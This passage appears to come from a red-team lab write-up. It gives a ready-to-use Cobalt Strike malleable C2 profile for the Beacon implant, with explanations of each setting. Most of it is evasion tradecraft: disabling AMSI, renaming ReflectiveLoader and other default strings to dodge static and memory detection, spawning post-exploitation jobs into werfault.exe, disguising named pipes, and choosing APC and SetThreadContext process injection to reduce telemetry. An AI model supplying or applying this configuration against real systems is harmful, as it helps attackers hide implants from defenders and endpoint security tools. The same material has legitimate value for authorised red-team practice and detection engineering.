The lab wouldn't require a highly specific C2 profile, but removing obvious default settings would be beneficial. The goal of the preparation phase is simple: to make the Beacon lifecycle more discreet, more reliable, and easier to manage across different workstations, SQL Server, and trusted environments.

```bash
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";
   set copy_pe_header "false";
   set obfuscate "true";
   transform-x86 {
        strrep "ReflectiveLoader" "NetlogonMain";
   }
   transform-x64 {
        strrep "ReflectiveLoader" "NetlogonMain";
   }
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "%windir%\\sysnative\\werfault.exe";
  set obfuscate "true";
  set cleanup "true";
  set pipename "TSVCPIPE-#####,########-####-####-####-############";
  set spawnto_x86 "%windir%\\syswow64\\werfault.exe";
  set smartinject "true"; 
  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
  }
  transform-x86 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
  }
}
process-inject {
  execute { NtQueueApcThread-s; NtQueueApcThread; SetThreadContext; }
}
```

### Stage

- `userwx "false"` reduces the classic RWX footprint during stage handling.
- `module_x64 "Hydrogen.dll"` avoids leaving the default reflective-loader naming behind.
- `copy_pe_header "false"` and `obfuscate "true"` reduce the amount of stock structure that survives in memory.
- replacing `ReflectiveLoader` with `NetlogonMain` removes one of the easiest static strings to notice in stock artifacts.

### Post-exploitation

- `amsi_disable "true"` supports PowerShell-heavy actions without needing to re-solve AMSI every time.
- `spawnto_x64` and `spawnto_x86` point to `werfault.exe`, which is believable enough for the lab flow and less noisy than common defaults.
- `cleanup "true"` and `smartinject "true"` keep post-ex behavior cleaner and more consistent.
- the custom `pipename` makes linked and pivoted sessions feel less stock.
- string replacements for `ExecuteAssembly` and `PowerPick` reduce easy memory and telemetry hits from default Beacon artifacts.

### Process Injection

- `NtQueueApcThread-s`: stealthier APC injection variant intended to reduce noise and telemetry.
- `NtQueueApcThread`: queues an APC into a remote thread so code runs when the thread enters an alertable state.
- `SetThreadContext`: modifies a thread’s execution context to redirect execution to attacker-controlled code.
